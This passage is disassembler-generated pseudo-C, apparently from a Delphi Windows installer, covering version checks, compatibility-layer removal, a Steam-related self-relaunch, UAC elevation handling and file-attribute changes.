  _DWORD *v19; // [esp+14h] [ebp-10h] BYREF
  int v20; // [esp+18h] [ebp-Ch] BYREF
  const int *v21; // [esp+1Ch] [ebp-8h] BYREF
  int v22; // [esp+20h] [ebp-4h] BYREF
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v14 = a1;
  v13 = &savedregs;
  v12[1] = &loc_45BF2A;
  v12[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  v11 = sub_406C44(&dword_46F6DC);
  v10 = sub_406C44(&dword_46F6E0);
  ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)sub_406C44(&dword_46F6D0);
  sub_426040(0, &v16);
  sub_44DBB0(v16, 1, 0, v11, v10, (int *)ExceptionList);
  LOBYTE(v2) = 1;
  v19 = (_DWORD *)Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(
                    &cls_CrossPlatform_TResourceStream,
                    v2,
                    hModule,
                    L"brs",
                    10);
  v11 = &savedregs;
  v10 = (volatile __int32 *)&loc_45BE12;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  LODWORD(v4) = (*(int (__fastcall **)(_DWORD *, _DWORD, int, int *, void *, struct _EXCEPTION_REGISTRATION_RECORD *))*v19)(
                  v19,
                  *v19,
                  v3,
                  &savedregs,
                  &loc_45BE12,
                  ExceptionList);
  if ( v4 > 0 )
  {
    sub_45A200((int)v19, (int)&v15, a2);
    sub_407840(&v18, (int)v15, (int)v13);
    if ( v18 )
    {
      sub_407AA0(v18, (int)L"0.0");
      if ( !v5 )
        sub_406FE8(&dword_46F6D0, v18);
    }
  }
  __writefsdword(0, (unsigned int)v13);
  v15 = &loc_45BE19;
  unknown_libname_94(&v19);
  sub_451B20(&dword_46F6D4);
  if ( dword_46F6D0 )
  {
    v6 = sub_408B34(&v21, (int)&byte_4224D0);
    sub_424750(dword_46F6D0, (int)&str___7[1], v6);
    if ( System::__linkproc__ LStrLen(v21) == 2
      && (unsigned __int8)Sysutils::TryStrToInt(*v21, &v22)
      && (unsigned __int8)Sysutils::TryStrToInt(v21[1], &v20) )
    {
      byte_467E7C = (_BYTE)v22 == 13;
      byte_46F6D8 = v22;
      dword_46F6D4 = v20;
    }
  }
  if ( !dword_46F6E0 )
  {
    sub_45AFD0((int)L"PersistRef", &v14, a2);
    sub_406FE8(&dword_46F6E0, v14);
  }
  sub_407030(&v17, (__int32)dword_46F6DC);
  if ( !v17 )
  {
    v7 = sub_45BD10();
    sub_415150(v7 & 0x7F, &v17);
  }
  sub_459810(v17, byte_467E7C, 0);
  __writefsdword(0, (unsigned int)v13);
  v15 = &loc_45BF31;
  sub_406C44(&v14);
  sub_406C68(&v15);
  sub_406CA4((int)&v16, 3);
  return sub_408B34(&v21, (int)&byte_4224D0);
}
// 45BF01: bad sp value at call
// 45BD99: variable 'v2' is possibly undefined
// 45BDB4: variable 'v3' is possibly undefined
// 45BDBE: variable 'v4' is possibly undefined
// 45BDED: variable 'v5' is possibly undefined
// 408670: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 41C304: using guessed type int __fastcall unknown_libname_94(_DWORD);
// 4224D0: using guessed type char byte_4224D0;
// 42286C: using guessed type int (*cls_CrossPlatform_TResourceStream)();
// 427C00: using guessed type _DWORD __fastcall Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(_DWORD, _DWORD, HMODULE hModule, _DWORD, _DWORD);
// 45BF44: using guessed type wchar_t aBrs[4];
// 45BF58: using guessed type wchar_t a00_0[4];
// 45BF64: using guessed type _strings str___7[1];
// 45BF7C: using guessed type wchar_t aPersistref[11];
// 467E7C: using guessed type char byte_467E7C;
// 46F6D0: using guessed type int dword_46F6D0;
// 46F6D4: using guessed type int dword_46F6D4;
// 46F6D8: using guessed type char byte_46F6D8;
// 46F6E0: using guessed type int dword_46F6E0;

//----- (0045BFA0) --------------------------------------------------------
int __usercall sub_45BFA0@<eax>(volatile __int32 *a1@<eax>, int a2@<ebx>, int a3@<esi>)
{
  int v3; // eax
  unsigned int v5[2]; // [esp-Ch] [ebp-28h] BYREF
  int *v6; // [esp-4h] [ebp-20h]
  int v7; // [esp+0h] [ebp-1Ch] BYREF
  __int32 v8; // [esp+4h] [ebp-18h] BYREF
  __int32 v9; // [esp+8h] [ebp-14h] BYREF
  int v10; // [esp+Ch] [ebp-10h] BYREF
  int v11; // [esp+10h] [ebp-Ch]
  int v12; // [esp+14h] [ebp-8h]
  volatile __int32 *v13; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v11 = 0;
  v10 = 0;
  v9 = 0;
  v8 = 0;
  v7 = 0;
  v13 = a1;
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_45C03F;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  sub_426040(0, &v10);
  sub_423AF0(v10, v13, a2, a3);
  v3 = sub_425FD0();
  if ( v3 > 0 )
  {
    v11 = v3;
    v12 = 1;
    do
    {
      sub_426040(v12, &v7);
      sub_423AF0(v7, &v8, a2, a3);
      sub_424890(*v13, v8, (int)&str___19[1], &v9);
      sub_406FE8(v13, v9);
      ++v12;
      --v11;
    }
    while ( v11 );
  }
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_45C046;
  return sub_406CA4((int)&v7, 4);
}
// 45C050: using guessed type _strings str___19[1];

//----- (0045C060) --------------------------------------------------------
char __cdecl sub_45C060(int a1)
{
  int *v1; // eax
  BOOL *v3; // [esp-38h] [ebp-4Ch]
  __int64 v4; // [esp-24h] [ebp-38h]
  __int64 v5; // [esp-1Ch] [ebp-30h]
  __int64 v6; // [esp-14h] [ebp-28h]
  int v7; // [esp-14h] [ebp-28h]
  unsigned int v8[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v9; // [esp-4h] [ebp-18h]
  int v10; // [esp+0h] [ebp-14h] BYREF
  __int32 v11; // [esp+4h] [ebp-10h] BYREF
  __int32 v12; // [esp+8h] [ebp-Ch] BYREF
  BOOL *v13; // [esp+Ch] [ebp-8h] BYREF
  char v14; // [esp+13h] [ebp-1h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v12 = 0;
  v11 = 0;
  v10 = 0;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_45C12A;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v6 = *(unsigned int *)(a1 - 12);
  v5 = *(unsigned int *)(a1 - 8);
  v4 = *(unsigned int *)(a1 - 4);
  sub_4238D0(&v12);
  sub_4254A0(v12, &v13);
  v3 = v13;
  v1 = (int *)sub_4582B0();
  sub_4521B0(v1, 998, (__int32)&dword_46F6D4, v6, v5, v4, 0i64, 0i64, v3);
  sub_433460(*off_467F18, (int)L"ShowBadWindowsVersion", (int)L"Installer:");
  if ( !*(_BYTE *)(a1 - 13) )
  {
    sub_4516A0(4u, &v11);
    v7 = v11;
    sub_45A110(&v10);
    sub_441B80(0, v7, v10, 0x10u);
  }
  v14 = 0;
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_45C131;
  sub_406CA4((int)&v10, 4);
  return v14;
}
// 45C144: using guessed type wchar_t aInstaller_3[11];
// 45C168: using guessed type wchar_t aShowbadwindows[22];
// 467F18: using guessed type int *off_467F18;
// 46F6D4: using guessed type int dword_46F6D4;
// 45C060: using guessed type BOOL *var_8;

//----- (0045C1A0) --------------------------------------------------------
char __fastcall sub_45C1A0(char a1)
{
  int v1; // ecx
  int v2; // ecx
  int v3; // ecx
  int *v5; // [esp-30h] [ebp-5Ch]
  _DWORD v6[3]; // [esp-Ch] [ebp-38h] BYREF
  int v7; // [esp+0h] [ebp-2Ch] BYREF
  int v8; // [esp+4h] [ebp-28h] BYREF
  int v9; // [esp+8h] [ebp-24h] BYREF
  int v10; // [esp+Ch] [ebp-20h] BYREF
  int v11; // [esp+10h] [ebp-1Ch] BYREF
  int v12; // [esp+14h] [ebp-18h] BYREF
  void *v13; // [esp+18h] [ebp-14h] BYREF
  char v14; // [esp+1Eh] [ebp-Eh]
  char v15; // [esp+1Fh] [ebp-Dh]
  unsigned int v16; // [esp+20h] [ebp-Ch] BYREF
  unsigned int v17; // [esp+24h] [ebp-8h]
  unsigned int v18; // [esp+28h] [ebp-4h]
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  v15 = a1;
  v6[2] = &savedregs;
  v6[1] = &loc_45C2CE;
  v6[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  if ( sub_44C3D0(&v16) )
  {
    sub_44CCB0(&v11);
    sub_415178(&v10, 0, v1, v16);
    sub_415178(&v9, 0, v2, v17);
    sub_415178(&v8, 0, v3, v18);
    v5 = dword_45C334;
    sub_4079F0(&v12, 9);
    sub_433460(*off_467F18, v12, (int)L"Installer:");
  }
  sub_4273A0((int)L"__COMPAT_LAYER", (int *)&v13);
  if ( v13 )
  {
    sub_407968(&v7, L"Removed __COMPAT_LAYER: ", v13);
    sub_433BE0(*off_467F18, v7, 0);
    SetEnvironmentVariableW(L"__COMPAT_LAYER", &Value);
  }
  if ( v16 < 0xA )
  {
    if ( v16 >= 6 && v17 )
      v14 = 1;
    else
      v14 = sub_45C060((int)&savedregs);
  }
  else
  {
    v14 = 1;
  }
  __writefsdword(0, (unsigned int)v5);
  sub_406CA4((int)&v7, 7);
  return v14;
}
// 45C1EC: variable 'v1' is possibly undefined
// 45C203: variable 'v2' is possibly undefined
// 45C21A: variable 'v3' is possibly undefined
// 45C2B8: variable 'v5' is possibly undefined
// 45C31C: using guessed type _strings str___8[1];
// 45C334: using guessed type int dword_45C334[4];
// 45C344: using guessed type wchar_t aInstaller_4[11];
// 45C368: using guessed type wchar_t aCompatLayer[15];
// 45C394: using guessed type wchar_t aRemovedCompatL[25];
// 467F18: using guessed type int *off_467F18;

//----- (0045C3F0) --------------------------------------------------------
char __usercall sub_45C3F0@<al>(_DWORD **a1@<edi>)
{
  char result; // al

  result = sub_44DEA0(dword_46F6EC != 0, (volatile __int32 *)&dword_46F6F8, a1);
  byte_46F6F4 = result;
  return result;
}
// 46F6F4: using guessed type char byte_46F6F4;

//----- (0045C410) --------------------------------------------------------
volatile __int32 *__usercall sub_45C410@<eax>(int a1@<eax>, int a2)
{
  int v2; // eax
  int v3; // eax

  v2 = System::__linkproc__ LStrLen(*(_DWORD *)(a2 - 4));
  System::__linkproc__ DynArraySetLength(v2 + 1);
  v3 = sub_40867C(*(_DWORD *)(a2 - 4));
  return sub_406FE8((volatile __int32 *)(*(_DWORD *)(a2 - 4) + 4 * v3), a1);
}
// 408670: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);

//----- (0045C460) --------------------------------------------------------
char sub_45C460()
{
  char v0; // zf
  int v1; // eax
  LPWSTR CommandLineW_0; // eax
  BOOL v3; // eax
  int *v5; // [esp-28h] [ebp-BCh]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-ACh] BYREF
  void *v7; // [esp-14h] [ebp-A8h]
  int *v8; // [esp-10h] [ebp-A4h]
  _DWORD v9[3]; // [esp-Ch] [ebp-A0h] BYREF
  int v10; // [esp+0h] [ebp-94h] BYREF
  int v11; // [esp+4h] [ebp-90h] BYREF
  int v12; // [esp+8h] [ebp-8Ch] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+Ch] [ebp-88h] BYREF
  struct _STARTUPINFOW StartupInfo; // [esp+1Ch] [ebp-78h] BYREF
  int v15; // [esp+60h] [ebp-34h]
  bool v16; // [esp+67h] [ebp-2Dh]
  int v17; // [esp+68h] [ebp-2Ch] BYREF
  int v18; // [esp+6Ch] [ebp-28h] BYREF
  LPVOID lpEnvironment; // [esp+70h] [ebp-24h]
  LPWSTR lpCommandLine; // [esp+74h] [ebp-20h]
  int System__AnsiString; // [esp+78h] [ebp-1Ch]
  _WORD *v22; // [esp+7Ch] [ebp-18h] BYREF
  int v23; // [esp+80h] [ebp-14h] BYREF
  char v24; // [esp+86h] [ebp-Eh]
  char v25; // [esp+87h] [ebp-Dh]
  Idthreadcomponent::TIdThreadComponent *v26; // [esp+88h] [ebp-Ch]
  char v27; // [esp+8Fh] [ebp-5h]
  int v28; // [esp+90h] [ebp-4h] BYREF
  int savedregs; // [esp+94h] [ebp+0h] BYREF

  v10 = 0;
  v11 = 0;
  v12 = 0;
  v28 = 0;
  v23 = 0;
  v22 = 0;
  v18 = 0;
  v17 = 0;
  v9[2] = &savedregs;
  v9[1] = &loc_45C745;
  v9[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  v27 = 0;
  v25 = 0;
  v24 = 0;
  v26 = (Idthreadcomponent::TIdThreadComponent *)sub_405568((int)cls_CrossPlatform_TUnicodeStringList, 1);
  v8 = &savedregs;
  v7 = &loc_45C5C7;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( (unsigned __int8)sub_425BB0(v26) && *((_DWORD *)v26 + 2) - 1 >= 0 )
  {
    v15 = *((_DWORD *)v26 + 2);
    System__AnsiString = 0;
    do
    {
      sub_428E60(v26, System__AnsiString, (volatile __int32 *)&v22);
      if ( System::__linkproc__ LStrLen(v22) && *v22 != 61 )
      {
        sub_407AD8((int)v22, 1, 20, &v12);
        sub_407AA0(v12, (int)L"IgnoreChildProcesses");
        if ( v0 )
        {
          sub_407AA0((int)v22, (int)L"IgnoreChildProcesses=1");
          v25 = v0;
        }
        else
        {
          sub_407AD8((int)v22, 1, 10, &v11);
          sub_407AA0(v11, (int)L"SteamAppId");
          if ( v0 )
          {
            v24 = 1;
            sub_407AD8((int)v22, 12, 0x7FFFFFFF, &v17);
          }
          sub_45C410((int)v22, (int)&savedregs);
        }
      }
      ++System__AnsiString;
      --v15;
    }
    while ( v15 );
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  v8 = (int *)&loc_45C5CE;
  sub_405598(v26);
  if ( v24 && !v25 )
  {
    sub_45C410((int)L"IgnoreChildProcesses=1", (int)&savedregs);
    sub_406C44(&v23);
    v1 = sub_40867C(v28);
    if ( v1 >= 0 )
    {
      v15 = v1 + 1;
      System__AnsiString = 0;
      do
      {
        v8 = (int *)v23;
        v7 = *(void **)(v28 + 4 * System__AnsiString);
        ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&dword_45C7F8;
        sub_4079F0(&v23, 3);
        ++System__AnsiString;
        --v15;
      }
      while ( v15 );
    }
    sub_407910(&v23, &dword_45C7F8);
    lpEnvironment = (LPVOID)sub_407790(v23);
    Guitesting::TGUITestCase::Hide(&StartupInfo, 68);
    StartupInfo.cb = 68;
    StartupInfo.wShowWindow = 1;
    StartupInfo.dwFlags = 1;
    Guitesting::TGUITestCase::Hide(&ProcessInformation, 16);
    CommandLineW_0 = GetCommandLineW_0();
    unknown_libname_50(&v10, CommandLineW_0);
    v5 = dword_45C834;
    sub_4079F0(&v18, 4);
    lpCommandLine = (LPWSTR)sub_407790(v18);
    v3 = CreateProcessW_0(0, lpCommandLine, 0, 0, 0, 0x400u, lpEnvironment, 0, &StartupInfo, &ProcessInformation);
    v16 = v3;
    if ( v3 )
    {
      CloseHandle_0(ProcessInformation.hThread);
      v27 = 1;
    }
  }
  __writefsdword(0, (unsigned int)v5);
  sub_406CA4((int)&v10, 3);
  sub_406CA4((int)&v17, 2);
  sub_406CA4((int)&v22, 2);
  sub_408B34(&v28, (int)&byte_4224D0);
  return v27;
}
// 45C541: variable 'v0' is possibly undefined
// 45C704: variable 'v5' is possibly undefined
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);
// 4224D0: using guessed type char byte_4224D0;
// 4232BC: using guessed type int (*cls_CrossPlatform_TUnicodeStringList[3])();
// 4237B0: using guessed type int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD);
// 45C760: using guessed type wchar_t aIgnorechildpro[21];
// 45C798: using guessed type wchar_t aIgnorechildpro_0[23];
// 45C7D4: using guessed type wchar_t aSteamappid_0[11];
// 45C7F8: using guessed type int dword_45C7F8;
// 45C834: using guessed type int dword_45C834[3];

//----- (0045C840) --------------------------------------------------------
int __usercall sub_45C840@<eax>(_DWORD **a1@<edi>)
{
  unsigned int v2[2]; // [esp-24h] [ebp-40h] BYREF
  int *v3; // [esp-1Ch] [ebp-38h]
  unsigned int v4; // [esp-18h] [ebp-34h]
  const wchar_t *v5; // [esp-14h] [ebp-30h]
  void *v6; // [esp-10h] [ebp-2Ch]
  _DWORD v7[3]; // [esp-Ch] [ebp-28h] BYREF
  unsigned int v8; // [esp+0h] [ebp-1Ch] BYREF
  int v9; // [esp+4h] [ebp-18h] BYREF
  int v10; // [esp+8h] [ebp-14h] BYREF
  void *v11; // [esp+Ch] [ebp-10h] BYREF
  _DWORD *v12; // [esp+10h] [ebp-Ch]
  int v13; // [esp+14h] [ebp-8h] BYREF
  int v14; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v12 = 0;
  v11 = 0;
  v10 = 0;
  v9 = 0;
  v8 = 0;
  v7[2] = &savedregs;
  v7[1] = &loc_45C943;
  v7[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v14 = 1569;
  sub_426040(0, &v9);
  sub_426830(v9, &v10);
  sub_4253F0(v10, &v11);
  v6 = v11;
  v5 = L"gc_test_version_set.";
  sub_415150(1569, (int *)&v8);
  v4 = v8;
  sub_4079F0(&v13, 3);
  if ( (unsigned __int8)sub_426B00(v13) )
  {
    v12 = (_DWORD *)sub_43EF70((int)&cls_IniUtil_TUnicodeIniFile, 1, v13, a1, 0, 0, 0, 1);
    v3 = &savedregs;
    v2[1] = (unsigned int)&loc_45C909;
    v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v2);
    v14 = Xmldoc::TXMLNodeList::Delete(v14);
    __writefsdword(0, v2[0]);
    v3 = (int *)&loc_45C910;
    sub_405598(v12);
  }
  __writefsdword(0, v4);
  v6 = &loc_45C94A;
  sub_406CA4((int)&v8, 2);
  sub_406C44(&v10);
  sub_406C44(&v11);
  sub_406C44(&v13);
  return v14;
}
// 43E520: using guessed type int (__stdcall *cls_IniUtil_TUnicodeIniFile)(int);
// 43FE70: using guessed type _DWORD __stdcall Xmldoc::TXMLNodeList::Delete(_DWORD);
// 45C960: using guessed type wchar_t aGcTestVersionS[21];

//----- (0045C9C0) --------------------------------------------------------
char sub_45C9C0()
{
  int v0; // eax
  char v1; // zf
  unsigned int v3[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v4; // [esp-4h] [ebp-14h]
  int v5; // [esp+0h] [ebp-10h] BYREF
  int v6; // [esp+4h] [ebp-Ch]
  int v7; // [esp+8h] [ebp-8h]
  char v8; // [esp+Fh] [ebp-1h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v5 = 0;
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_45CA2F;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  v0 = sub_425FD0();
  if ( v0 < 0 )
  {
LABEL_6:
    v8 = 0;
  }
  else
  {
    v6 = v0 + 1;
    v7 = 0;
    while ( 1 )
    {
      sub_426040(v7, &v5);
      sub_407AA0(v5, (int)L"elevated");
      if ( v1 )
        break;
      ++v7;
      if ( !--v6 )
        goto LABEL_6;
    }
    v8 = 1;
  }
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_45CA36;
  sub_406C44(&v5);
  return v8;
}
// 45CA05: variable 'v1' is possibly undefined
// 45CA4C: using guessed type wchar_t aElevated[9];

//----- (0045CA60) --------------------------------------------------------
int __usercall sub_45CA60@<eax>(volatile __int32 *a1@<eax>, int a2@<ebx>, int a3@<esi>)
{
  int v3; // eax
  unsigned int v5[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v6; // [esp-4h] [ebp-1Ch]
  int v7; // [esp+0h] [ebp-18h] BYREF
  __int32 v8; // [esp+4h] [ebp-14h] BYREF
  __int32 v9; // [esp+8h] [ebp-10h] BYREF
  int v10; // [esp+Ch] [ebp-Ch]
  int v11; // [esp+10h] [ebp-8h]
  volatile __int32 *v12; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v9 = 0;
  v8 = 0;
  v7 = 0;
  v12 = a1;
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_45CAF7;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  sub_406C44(a1);
  v3 = sub_425FD0();
  if ( v3 > 0 )
  {
    v10 = v3;
    v11 = 1;
    do
    {
      sub_426040(v11, &v7);
      sub_423AF0(v7, &v8, a2, a3);
      sub_424890(*v12, v8, (int)&str___20[1], &v9);
      sub_406FE8(v12, v9);
      ++v11;
      --v10;
    }
    while ( v10 );
  }
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_45CAFE;
  return sub_406CA4((int)&v7, 3);
}
// 45CB08: using guessed type _strings str___20[1];

//----- (0045CB20) --------------------------------------------------------
char __usercall sub_45CB20@<al>(int a1@<ebx>, int a2@<esi>)
{
  int *v2; // eax
  HWND ActiveWindow; // eax
  int *v4; // eax
  int *v5; // eax
  int v7; // [esp-20h] [ebp-34h]
  unsigned int v8[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v9; // [esp-4h] [ebp-18h]
  int v10; // [esp+0h] [ebp-14h] BYREF
  int v11; // [esp+4h] [ebp-10h] BYREF
  __int32 v12; // [esp+8h] [ebp-Ch] BYREF
  int v13; // [esp+Ch] [ebp-8h] BYREF
  char v14; // [esp+13h] [ebp-1h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v12 = 0;
  v11 = 0;
  v10 = 0;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_45CCF1;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  if ( byte_467E89 )
  {
    sub_4333E0(*off_467F18, (int)L"Unable to elevate program. Previous elevation was failed.", (int)L"InstallerElevate");
    v14 = 0;
  }
  else if ( sub_44E310() || sub_45C9C0() )
  {
    sub_4333E0(*off_467F18, (int)L"Program is elevated already.", (int)L"InstallerElevate");
    v14 = 0;
  }
  else if ( byte_467E7E )
  {
    sub_4333E0(*off_467F18, (int)L"Elevation is silent mode prohibited.", (int)L"InstallerElevate");
    v2 = (int *)sub_4582B0();
    sub_4521B0(v2, 507, (__int32)&dword_46F6D4, 0i64, 0i64, 0i64, 0i64, 0i64, 0);
    v14 = 0;
  }
  else
  {
    sub_426040(0, &v11);
    sub_426830(v11, &v13);
    sub_45CA60(&v12, a1, a2);
    sub_433BE0(*off_467F18, (int)aDoRestartInEle, 0);
    if ( sub_425ED0(3u, 0)
      && sub_44E3B0()
      && (sub_4079F0(&v10, 3),
          v7 = v10,
          ActiveWindow = GetActiveWindow(),
          sub_44E280(ActiveWindow, v13, v7, (int)L"elevated")) )
    {
      v4 = (int *)sub_4582B0();
      sub_4521B0(v4, 511, (__int32)&dword_46F6D4, 0i64, 0i64, 0i64, 0i64, 0i64, 0);
      v14 = 1;
    }
    else
    {
      byte_467E89 = 1;
      sub_4333E0(*off_467F18, (int)L"Unable to elevate program.", (int)L"InstallerElevate");
      v5 = (int *)sub_4582B0();
      sub_4521B0(v5, 508, (__int32)&dword_46F6D4, 0i64, 0i64, 0i64, 0i64, 0i64, 0);
      v14 = 0;
    }
  }
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_45CCF8;
  sub_406CA4((int)&v10, 4);
  return v14;
}
// 45CD0C: using guessed type wchar_t aInstallereleva[17];
// 45CD3C: using guessed type wchar_t aUnableToElevat[58];
// 45CDBC: using guessed type wchar_t aProgramIsEleva[29];
// 45CE04: using guessed type wchar_t aElevationIsSil[37];
// 45CE5C: using guessed type wchar_t aDoRestartInEle[27];
// 45CE9C: using guessed type _strings str___21[1];
// 45CEB4: using guessed type wchar_t aElevated_0[9];
// 45CED4: using guessed type wchar_t aUnableToElevat_0[27];
// 467E7E: using guessed type char byte_467E7E;
// 467E89: using guessed type char byte_467E89;
// 467F18: using guessed type int *off_467F18;
// 46F6D4: using guessed type int dword_46F6D4;

//----- (0045CF10) --------------------------------------------------------
bool __fastcall sub_45CF10(int a1)
{
  signed int v1; // eax
  unsigned int v3[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v4; // [esp-4h] [ebp-14h]
  int v5; // [esp+0h] [ebp-10h] BYREF
  int v6; // [esp+4h] [ebp-Ch] BYREF
  bool v7; // [esp+Bh] [ebp-5h]
  int v8; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v6 = 0;
  v5 = 0;
  v8 = a1;
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_45CF97;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  if ( (unsigned __int8)sub_426B00(a1) )
  {
    v1 = unknown_libname_30(10000000);
    sub_415150(v1, &v5);
    sub_4079F0(&v6, 3);
    v7 = sub_426B80(v8, v6);
  }
  else
  {
    v7 = 0;
  }
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_45CF9E;
  sub_406C44(&v5);
  sub_406C44(&v6);
  return v7;
}
// 405060: using guessed type int __fastcall unknown_libname_30(_DWORD);
// 45CF10: using guessed type int var_C;

//----- (0045CFC0) --------------------------------------------------------
char __usercall sub_45CFC0@<al>(
        unsigned int a1@<eax>,
        BOOL a2@<ebx>,
        int a3@<edi>,
        int a4@<esi>,
        long double a5@<st0>,
        int a6)
{
  const WCHAR *v6; // eax
  const WCHAR *v7; // eax
  DWORD FileAttributesW; // [esp+4h] [ebp-Ch]
  char v10; // [esp+Bh] [ebp-5h]

  if ( sub_45CF10(a1) )
    return 1;
  sub_425600(a1, a2, a4);
  v10 = 0;
  if ( !sub_423E00(a1, 3, a2) )
  {
    sub_44EB90(a1, 0, a3, a4, a5);
    v6 = (const WCHAR *)sub_407790(a1);
    FileAttributesW = GetFileAttributesW(v6);
    if ( FileAttributesW != -1 && (FileAttributesW & 1) != 0 )
    {
      v7 = (const WCHAR *)sub_407790(a1);
      SetFileAttributesW(v7, FileAttributesW & 0xFFFFFFFE);
    }
    if ( sub_45CF10(a1) )
    {
      return 1;
    }
    else
    {
      sub_425600(a1, a2, a4);
      if ( !sub_423E00(a1, 3, a2) && sub_425ED0(3u, 0) && sub_44E3B0() && !sub_44E310() && sub_45CB20(a2, a4) )
      {
        *(_BYTE *)(a6 - 1) = 0;
        return 1;
      }
    }
  }
  return v10;
}

//----- (0045D0C0) --------------------------------------------------------
char __usercall sub_45D0C0@<al>(BOOL a1@<ebx>, int a2@<edi>, int a3@<esi>, long double a4@<st0>)
{
  int *v4; // eax
  void *v5; // eax
  int v7; // [esp-14h] [ebp-30h]
  unsigned int v8[2]; // [esp-Ch] [ebp-28h] BYREF
  int *v9; // [esp-4h] [ebp-20h]
  int v10; // [esp+0h] [ebp-1Ch] BYREF
  void *v11; // [esp+4h] [ebp-18h] BYREF
  int v12; // [esp+8h] [ebp-14h]
  __int32 v13; // [esp+Ch] [ebp-10h] BYREF
  unsigned int v14; // [esp+10h] [ebp-Ch] BYREF
  unsigned int v15; // [esp+14h] [ebp-8h] BYREF
  char v16; // [esp+1Ah] [ebp-2h]
  char v17; // [esp+1Bh] [ebp-1h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v14 = 0;
  v13 = 0;
  v12 = 0;
  v11 = 0;
  v10 = 0;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_45D1FE;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v16 = 1;
  v17 = 1;
  sub_425600((int)dword_46F6F8, a1, a3);
  if ( !sub_423E00((int)dword_46F6F8, 3, a1) )
  {
    System::Randomize();
    sub_4252A0((int)dword_46F6F8, (volatile __int32 *)&v15);
    sub_425430(v15, &v14);
    if ( sub_45CFC0(v14, a1, a2, a3, a4, (int)&savedregs) )
    {
      v16 = v17;
    }
    else if ( sub_45CFC0(v15, a1, a2, a3, a4, (int)&savedregs) )
    {
      v16 = v17;
    }
    else if ( !sub_423E00((int)dword_46F6F8, 3, a1) )
    {
      v4 = (int *)sub_4582B0();
      sub_4521B0(v4, 506, (__int32)&dword_46F6D4, 0i64, 0i64, 0i64, 0i64, 0i64, 0);
      if ( !byte_467E7E )
      {
        v5 = dword_46F6F8;
        v11 = dword_46F6F8;
        LOBYTE(v12) = 17;
        LOBYTE(v5) = 43;
        sub_4516E0((int)v5, (int)&v11, 0, &v13);
        v7 = v13;
        sub_45A110(&v10);
        sub_441B80(0, v7, v10, 0x10u);
      }
      v16 = 0;
    }
  }
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_45D205;
  sub_406C44(&v10);
  sub_406CA4((int)&v13, 2);
  sub_406C44(&v15);
  return v16;
}
// 467E7E: using guessed type char byte_467E7E;
// 46F6D4: using guessed type int dword_46F6D4;
// 45D0C0: using guessed type unsigned int var_8;

//----- (0045D210) --------------------------------------------------------
